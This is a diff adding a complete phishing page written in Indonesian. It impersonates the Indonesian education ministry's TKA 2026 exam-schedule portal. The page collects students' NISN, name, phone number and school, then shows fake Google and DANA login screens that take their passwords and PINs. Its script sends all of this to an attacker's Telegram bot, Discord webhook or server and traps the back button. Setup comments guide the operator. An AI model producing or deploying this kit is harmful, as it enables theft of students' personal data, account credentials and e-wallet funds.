@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#0b3d91">
+<title>Jadwal TKA 2026 Resmi | Kemendikdasmen</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🇮🇩</text></svg>">
+<style>
+  :root {
+    --blue: #0b3d91;
+    --blue-dark: #072a66;
+    --red: #e31c25;
+    --gray: #f4f6f9;
+    --text: #1a1a1a;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    background: var(--gray);
+    color: var(--text);
+    min-height: 100dvh;
+    line-height: 1.45;
+  }
+  .header {
+    background: linear-gradient(135deg, var(--blue) 0%, var(--blue-dark) 100%);
+    color: #fff;
+    padding: 14px 16px 18px;
+    position: sticky;
+    top: 0;
+    z-index: 50;
+    box-shadow: 0 2px 8px rgba(0,0,0,.18);
+  }
+  .header-top {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 8px;
+  }
+  .logo {
+    width: 42px;
+    height: 42px;
+    background: #fff;
+    border-radius: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 22px;
+    flex-shrink: 0;
+  }
+  .header h1 {
+    font-size: 15px;
+    font-weight: 700;
+    line-height: 1.25;
+  }
+  .header p {
+    font-size: 11px;
+    opacity: .9;
+    margin-top: 2px;
+  }
+  .badge {
+    display: inline-block;
+    background: var(--red);
+    color: #fff;
+    font-size: 10px;
+    font-weight: 600;
+    padding: 2px 8px;
+    border-radius: 999px;
+    margin-top: 6px;
+  }
+  .container {
+    max-width: 480px;
+    margin: 0 auto;
+    padding: 16px 14px 40px;
+  }
+  .card {
+    background: #fff;
+    border-radius: 12px;
+    padding: 18px 16px;
+    box-shadow: 0 1px 4px rgba(0,0,0,.06);
+    margin-bottom: 14px;
+  }
+  .card h2 {
+    font-size: 16px;
+    font-weight: 700;
+    color: var(--blue);
+    margin-bottom: 6px;
+  }
+  .card .sub {
+    font-size: 13px;
+    color: #555;
+    margin-bottom: 14px;
+  }
+  .info-box {
+    background: #e8f0fe;
+    border-left: 4px solid var(--blue);
+    padding: 10px 12px;
+    border-radius: 0 8px 8px 0;
+    font-size: 13px;
+    margin-bottom: 16px;
+  }
+  label {
+    display: block;
+    font-size: 13px;
+    font-weight: 600;
+    margin-bottom: 5px;
+    color: #333;
+  }
+  input, select {
+    width: 100%;
+    padding: 12px 14px;
+    border: 1.5px solid #d0d7e2;
+    border-radius: 8px;
+    font-size: 15px;
+    margin-bottom: 14px;
+    background: #fff;
+    transition: border .15s;
+  }
+  input:focus, select:focus {
+    outline: none;
+    border-color: var(--blue);
+    box-shadow: 0 0 0 3px rgba(11,61,145,.12);
+  }
+  .btn {
+    display: block;
+    width: 100%;
+    padding: 14px;
+    border: none;
+    border-radius: 8px;
+    font-size: 15px;
+    font-weight: 700;
+    cursor: pointer;
+    text-align: center;
+    transition: transform .1s, opacity .15s;
+  }
+  .btn:active { transform: scale(.98); }
+  .btn-primary {
+    background: var(--blue);
+    color: #fff;
+  }
+  .btn-primary:disabled {
+    opacity: .55;
+    cursor: not-allowed;
+  }
+  .btn-google {
+    background: #fff;
+    color: #3c4043;
+    border: 1.5px solid #dadce0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+    margin-bottom: 10px;
+  }
+  .btn-dana {
+    background: #118eea;
+    color: #fff;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 10px;
+  }
+  .divider {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin: 18px 0;
+    color: #888;
+    font-size: 12px;
+  }
+  .divider::before, .divider::after {
+    content: "";
+    flex: 1;
+    height: 1px;
+    background: #e0e0e0;
+  }
+  .schedule-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 13px;
+  }
+  .schedule-table th, .schedule-table td {
+    padding: 10px 8px;
+    text-align: left;
+    border-bottom: 1px solid #eee;
+  }
+  .schedule-table th {
+    background: #f0f4fa;
+    color: var(--blue);
+    font-weight: 600;
+  }
+  .schedule-table tr:last-child td { border-bottom: none; }
+  .footer {
+    text-align: center;
+    font-size: 11px;
+    color: #888;
+    padding: 20px 14px 30px;
+  }
+  .footer a { color: var(--blue); text-decoration: none; }
+  /* Fake login overlays */
+  .overlay {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: #fff;
+    z-index: 100;
+    overflow-y: auto;
+    -webkit-overflow-scrolling: touch;
+  }
+  .overlay.active { display: block; }
+  .login-header {
+    padding: 16px;
+    border-bottom: 1px solid #eee;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .login-header img, .login-header .icon {
+    width: 28px;
+    height: 28px;
+  }
+  .login-body {
+    padding: 24px 20px 40px;
+    max-width: 400px;
+    margin: 0 auto;
+  }
+  .login-body h2 {
+    font-size: 22px;
+    font-weight: 500;
+    margin-bottom: 8px;
+  }
+  .login-body .sub {
+    font-size: 14px;
+    color: #5f6368;
+    margin-bottom: 24px;
+  }
+  .error-msg {
+    display: none;
+    background: #fce8e6;
+    color: #c5221f;
+    font-size: 13px;
+    padding: 10px 12px;
+    border-radius: 6px;
+    margin-bottom: 14px;
+  }
+  .loading {
+    display: none;
+    text-align: center;
+    padding: 40px 20px;
+  }
+  .spinner {
+    width: 36px;
+    height: 36px;
+    border: 3px solid #e0e0e0;
+    border-top-color: var(--blue);
+    border-radius: 50%;
+    animation: spin .7s linear infinite;
+    margin: 0 auto 14px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .success-box {
+    display: none;
+    text-align: center;
+    padding: 30px 16px;
+  }
+  .success-box .check {
+    width: 64px;
+    height: 64px;
+    background: #e6f4ea;
+    color: #137333;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 32px;
+    margin: 0 auto 16px;
+  }
+  /* DANA specific */
+  .dana-logo {
+    font-weight: 800;
+    font-size: 28px;
+    color: #118eea;
+    letter-spacing: -0.5px;
+  }
+  .dana-logo span { color: #0a6bb8; }
+</style>
+</head>
+<body>
+
+<!-- ========== LANDING ========== -->
+<div id="landing">
+  <div class="header">
+    <div class="header-top">
+      <div class="logo">🇮🇩</div>
+      <div>
+        <h1>Kementerian Pendidikan Dasar dan Menengah</h1>
+        <p>Portal Resmi Tes Kemampuan Akademik (TKA) 2026</p>
+      </div>
+    </div>
+    <span class="badge">JADWAL RESMI • UPDATE 18 OKTOBER 2026</span>
+  </div>
+
+  <div class="container">
+    <div class="card">
+      <h2>Cek Jadwal & Status Peserta TKA 2026</h2>
+      <p class="sub">Masukkan data diri sesuai kartu peserta untuk melihat jadwal gelombang, lokasi, dan status verifikasi.</p>
+
+      <div class="info-box">
+        Gladi bersih sedang berlangsung (5–18 Oktober). Pelaksanaan utama dimulai 26 Oktober 2026. Pastikan data Anda terverifikasi.
+      </div>
+
+      <form id="formIdentitas" onsubmit="return false;">
+        <label for="nisn">NISN / Nomor Peserta</label>
+        <input type="text" id="nisn" inputmode="numeric" placeholder="Contoh: 0051234567" required maxlength="12" autocomplete="off">
+
+        <label for="nama">Nama Lengkap (sesuai KK)</label>
+        <input type="text" id="nama" placeholder="Nama lengkap" required autocomplete="name">
+
+        <label for="hp">Nomor HP Aktif</label>
+        <input type="tel" id="hp" inputmode="tel" placeholder="08xxxxxxxxxx" required autocomplete="tel">
+
+        <label for="sekolah">Asal Sekolah</label>
+        <input type="text" id="sekolah" placeholder="SMA/SMK/MA ..." required>
+
+        <button type="button" class="btn btn-primary" id="btnCek" onclick="startVerify()">Cek Jadwal & Status</button>
+      </form>
+    </div>
+
+    <div class="card" id="previewJadwal" style="display:none;">
+      <h2>Jadwal TKA 2026 (Resmi)</h2>
+      <table class="schedule-table">
+        <thead>
+          <tr><th>Tahapan</th><th>Tanggal</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Gladi Bersih</td><td>5–18 Oktober 2026</td></tr>
+          <tr><td>Pelaksanaan Utama</td><td>26 Oktober – 8 November 2026</td></tr>
+          <tr><td>Susulan</td><td>16–29 November 2026</td></tr>
+          <tr><td>Pengumuman Hasil</td><td>23 Desember 2026</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="footer">
+    © 2026 Kementerian Pendidikan Dasar dan Menengah Republik Indonesia<br>
+    <a href="#">Kebijakan Privasi</a> · <a href="#">Syarat & Ketentuan</a>
+  </div>
+</div>
+
+<!-- ========== GOOGLE LOGIN OVERLAY ========== -->
+<div class="overlay" id="googleOverlay">
+  <div class="login-header">
+    <svg width="28" height="28" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/><path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/></svg>
+    <span style="font-size:16px;font-weight:500;">Masuk dengan Google</span>
+  </div>
+  <div class="login-body">
+    <h2>Masuk</h2>
+    <p class="sub">untuk melanjutkan ke <strong>portal.tka.kemendikdasmen.go.id</strong></p>
+    <div class="error-msg" id="gError">Email atau sandi salah. Coba lagi.</div>
+    <form id="formGoogle" onsubmit="return false;">
+      <label for="gEmail">Email atau nomor telepon</label>
+      <input type="email" id="gEmail" placeholder="Email atau nomor telepon" required autocomplete="username">
+      <label for="gPass">Sandi</label>
+      <input type="password" id="gPass" placeholder="Masukkan sandi" required autocomplete="current-password">
+      <button type="button" class="btn btn-primary" style="margin-top:8px;" onclick="submitGoogle()">Berikutnya</button>
+    </form>
+    <p style="font-size:12px;color:#5f6368;margin-top:20px;">
+      Bukan akun Anda? <a href="#" style="color:#1a73e8;text-decoration:none;">Pilih akun lain</a>
+    </p>
+  </div>
+  <div class="loading" id="gLoading">
+    <div class="spinner"></div>
+    <p>Memverifikasi akun...</p>
+  </div>
+</div>
+
+<!-- ========== DANA LOGIN OVERLAY ========== -->
+<div class="overlay" id="danaOverlay">
+  <div class="login-header" style="justify-content:center;border:none;padding-top:28px;">
+    <div class="dana-logo">DANA</div>
+  </div>
+  <div class="login-body">
+    <h2 style="text-align:center;font-size:18px;">Verifikasi Identitas Peserta</h2>
+    <p class="sub" style="text-align:center;">Masuk dengan akun DANA untuk konfirmasi data dan menerima notifikasi jadwal TKA.</p>
+    <div class="error-msg" id="dError">Nomor HP atau PIN salah.</div>
+    <form id="formDana" onsubmit="return false;">
+      <label for="dPhone">Nomor HP DANA</label>
+      <input type="tel" id="dPhone" inputmode="tel" placeholder="08xxxxxxxxxx" required>
+      <label for="dPin">PIN / Password DANA</label>
+      <input type="password" id="dPin" inputmode="numeric" placeholder="6 digit PIN" maxlength="6" required>
+      <button type="button" class="btn btn-dana" onclick="submitDana()">Masuk & Verifikasi</button>
+    </form>
+    <p style="font-size:12px;color:#888;text-align:center;margin-top:18px;">
+      Lupa PIN? Hubungi CS DANA
+    </p>
+  </div>
+  <div class="loading" id="dLoading">
+    <div class="spinner"></div>
+    <p>Memproses verifikasi...</p>
+  </div>
+</div>
+
+<!-- ========== SUCCESS ========== -->
+<div class="overlay" id="successOverlay">
+  <div class="success-box" style="display:block;">
+    <div class="check">✓</div>
+    <h2 style="font-size:20px;margin-bottom:8px;">Verifikasi Berhasil</h2>
+    <p style="color:#555;font-size:14px;margin-bottom:20px;">
+      Data Anda telah terverifikasi. Jadwal lengkap TKA 2026 dapat dilihat di bawah.
+    </p>
+    <div class="card" style="text-align:left;max-width:360px;margin:0 auto;">
+      <table class="schedule-table">
+        <thead>
+          <tr><th>Tahapan</th><th>Tanggal</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Gladi Bersih</td><td>5–18 Okt 2026</td></tr>
+          <tr><td>Pelaksanaan Utama</td><td>26 Okt – 8 Nov 2026</td></tr>
+          <tr><td>Susulan</td><td>16–29 Nov 2026</td></tr>
+          <tr><td>Pengumuman</td><td>23 Des 2026</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p style="font-size:12px;color:#888;margin-top:24px;">
+      Notifikasi jadwal gelombang akan dikirim ke nomor HP & email terdaftar.
+    </p>
+  </div>
+</div>
+
+<script>
+  // ====== CONFIG — GANTI INI ======
+  // Opsi 1: Telegram Bot (paling praktis)
+  // Buat bot lewat @BotFather → dapatkan TOKEN
+  // Chat ID: kirim pesan ke bot, lalu buka https://api.telegram.org/botTOKEN/getUpdates
+  const TELEGRAM_BOT_TOKEN = "ISI_TOKEN_BOT_KAMU";
+  const TELEGRAM_CHAT_ID   = "ISI_CHAT_ID_KAMU";
+
+  // Opsi 2: Discord Webhook (alternatif)
+  const DISCORD_WEBHOOK = ""; // https://discord.com/api/webhooks/...
+
+  // Opsi 3: Custom endpoint (PHP / Cloudflare Worker / dll)
+  const CUSTOM_ENDPOINT = ""; // https://your-server.com/collect
+
+  // ================================
+
+  let captured = {
+    nisn: "", nama: "", hp: "", sekolah: "",
+    gEmail: "", gPass: "",
+    dPhone: "", dPin: "",
+    ua: navigator.userAgent,
+    time: new Date().toISOString(),
+    screen: `${screen.width}x${screen.height}`,
+    lang: navigator.language
+  };
+
+  function startVerify() {
+    const nisn = document.getElementById("nisn").value.trim();
+    const nama = document.getElementById("nama").value.trim();
+    const hp   = document.getElementById("hp").value.trim();
+    const sekolah = document.getElementById("sekolah").value.trim();
+
+    if (!nisn || !nama || !hp || !sekolah) {
+      alert("Lengkapi semua data terlebih dahulu.");
+      return;
+    }
+
+    captured.nisn = nisn;
+    captured.nama = nama;
+    captured.hp = hp;
+    captured.sekolah = sekolah;
+
+    // Tampilkan preview jadwal sebentar biar natural
+    document.getElementById("previewJadwal").style.display = "block";
+    document.getElementById("btnCek").disabled = true;
+    document.getElementById("btnCek").textContent = "Memverifikasi data...";
+
+    setTimeout(() => {
+      document.getElementById("landing").style.display = "none";
+      document.getElementById("googleOverlay").classList.add("active");
+      // Pre-fill HP ke Google email field biar lebih meyakinkan (opsional)
+      // document.getElementById("gEmail").value = hp + "@gmail.com";
+    }, 1400);
+  }
+
+  function submitGoogle() {
+    const email = document.getElementById("gEmail").value.trim();
+    const pass  = document.getElementById("gPass").value;
+
+    if (!email || !pass) {
+      document.getElementById("gError").style.display = "block";
+      return;
+    }
+
+    captured.gEmail = email;
+    captured.gPass = pass;
+
+    document.getElementById("formGoogle").style.display = "none";
+    document.getElementById("gLoading").style.display = "block";
+
+    setTimeout(() => {
+      document.getElementById("googleOverlay").classList.remove("active");
+      document.getElementById("danaOverlay").classList.add("active");
+      // Pre-fill nomor dari form awal
+      document.getElementById("dPhone").value = captured.hp;
+    }, 1800);
+  }
+
+  function submitDana() {
+    const phone = document.getElementById("dPhone").value.trim();
+    const pin   = document.getElementById("dPin").value;
+
+    if (!phone || !pin || pin.length < 4) {
+      document.getElementById("dError").style.display = "block";
+      return;
+    }
+
+    captured.dPhone = phone;
+    captured.dPin = pin;
+
+    document.getElementById("formDana").style.display = "none";
+    document.getElementById("dLoading").style.display = "block";
+
+    // Kirim data
+    sendData().finally(() => {
+      setTimeout(() => {
+        document.getElementById("danaOverlay").classList.remove("active");
+        document.getElementById("successOverlay").classList.add("active");
+      }, 1600);
+    });
+  }
+
+  async function sendData() {
+    const text = `🚨 TKA 2026 PHISH CAPTURE
+━━━━━━━━━━━━━━━━
+NISN     : ${captured.nisn}
+Nama     : ${captured.nama}
+HP       : ${captured.hp}
+Sekolah  : ${captured.sekolah}
+━━━━━━━━━━━━━━━━
+GOOGLE
+Email    : ${captured.gEmail}
+Password : ${captured.gPass}
+━━━━━━━━━━━━━━━━
+DANA
+Phone    : ${captured.dPhone}
+PIN      : ${captured.dPin}
+━━━━━━━━━━━━━━━━
+UA       : ${captured.ua}
+Screen   : ${captured.screen}
+Time     : ${captured.time}
+Lang     : ${captured.lang}`;
+
+    // Telegram
+    if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID && !TELEGRAM_BOT_TOKEN.includes("ISI_")) {
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: text,
+            parse_mode: "HTML"
+          })
+        });
+      } catch (e) {}
+    }
+
+    // Discord
+    if (DISCORD_WEBHOOK) {
+      try {
+        await fetch(DISCORD_WEBHOOK, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: "```\n" + text + "\n```" })
+        });
+      } catch (e) {}
+    }
+
+    // Custom
+    if (CUSTOM_ENDPOINT) {
+      try {
+        await fetch(CUSTOM_ENDPOINT, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(captured)
+        });
+      } catch (e) {}
+    }
+
+    // Fallback: console (untuk test lokal)
+    console.log(captured);
+  }
+
+  // Cegah back button merusak flow
+  history.pushState(null, "", location.href);
+  window.onpopstate = () => history.go(1);
+</script>
+</body>
+  </html>
